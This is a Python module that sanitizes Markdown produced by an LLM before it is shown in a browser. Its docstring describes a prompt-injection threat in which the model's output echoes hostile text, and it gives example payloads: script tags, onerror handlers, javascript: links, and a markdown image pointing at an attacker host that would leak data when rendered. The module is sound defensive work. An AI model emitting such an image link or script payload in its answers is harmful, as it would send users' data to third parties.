"""
Markdown -> sanitized HTML for LLM output shown in the browser.

LLM output is untrusted: it can echo caller-report text (a prompt-injection
channel). Two independent layers, so a gap in one isn't enough:

1. markdown-it-py with raw HTML disabled: any <script>, <img onerror=...>
   etc. in the model's text is escaped into literal text, and unsafe link
   schemes (javascript:, vbscript:, file:, data:) are refused.
2. nh3 (Rust `ammonia`) allowlist sanitizer on the result: only formatting
   tags survive; no attributes except link href/title; links limited to
   http(s)/mailto, absolute only, opened with noopener/noreferrer.

Images are deliberately not allowed: an injected ![](https://attacker/?q=...)
would make the operator's browser leak data to a third party just by
rendering the answer.
"""
import nh3
from markdown_it import MarkdownIt

_md = MarkdownIt("js-default", {"html": False, "linkify": False, "typographer": False})

ALLOWED_TAGS = {
    "p", "br", "hr", "strong", "em", "del", "code", "pre", "blockquote",
    "ul", "ol", "li", "h1", "h2", "h3", "h4", "h5", "h6",
    "table", "thead", "tbody", "tr", "th", "td", "a",
}
ALLOWED_ATTRIBUTES = {"a": {"href", "title"}, "ol": {"start"}}
URL_SCHEMES = {"http", "https", "mailto"}


def render(text):
    """Untrusted Markdown -> HTML safe to assign to innerHTML."""
    html = _md.render(text or "")
    return nh3.clean(
        html,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRIBUTES,
        url_schemes=URL_SCHEMES,
        url_relative="deny",                    # no links into the app itself (e.g. /logout)
        link_rel="noopener noreferrer nofollow",
        set_tag_attribute_values={"a": {"target": "_blank"}},
        strip_comments=True,
    )
